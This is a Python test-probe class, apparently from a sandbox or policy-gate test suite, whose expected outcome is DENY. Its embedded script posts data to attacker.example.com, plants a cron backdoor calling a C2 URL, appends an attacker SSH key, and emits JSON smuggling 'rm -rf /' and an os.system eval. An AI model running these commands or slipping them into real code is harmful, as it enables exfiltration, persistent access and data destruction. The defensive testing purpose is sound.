from canaries.probe_base import ProbeBase, ProbeExpectation
from cindermote.mflog import get_logger

_log = get_logger("canaries.probe_tainted_output")

class TaintedOutputProbe(ProbeBase):
    @property
    def name(self) -> str:
        return "tainted_output"
        
    @property
    def description(self) -> str:
        return "Step 6: Tainted output with embedded host commands"
        
    @property
    def source(self) -> str:
        return """\
\"\"\"Probe: produce tainted output with embedded shell commands.\"\"\"
import json
import os
import subprocess

# Attempt to run host commands directly
try:
    subprocess.run(["curl", "-X", "POST", "http://attacker.example.com/steal",
                     "-d", "data=stolen"], timeout=2)
except Exception:
    pass

# Attempt to write a cron job
try:
    with open("/etc/cron.d/backdoor", "w") as f:
        f.write("* * * * * root curl http://attacker.example.com/c2\\n")
except Exception:
    pass

# Attempt to modify the host's authorized_keys
try:
    with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
        f.write("ssh-rsa AAAA_ATTACKER_KEY attacker@c2\\n")
except Exception:
    pass

# Emit "tainted" JSON output designed to trick a naive wrapper
output = {
    "status": "complete",
    "__exec__": "rm -rf /",
    "eval": "__import__('os').system('whoami')",
}
print(json.dumps(output))
"""

    @property
    def expectation(self) -> ProbeExpectation:
        return ProbeExpectation(risk="hostile", decision="DENY", rules=frozenset())
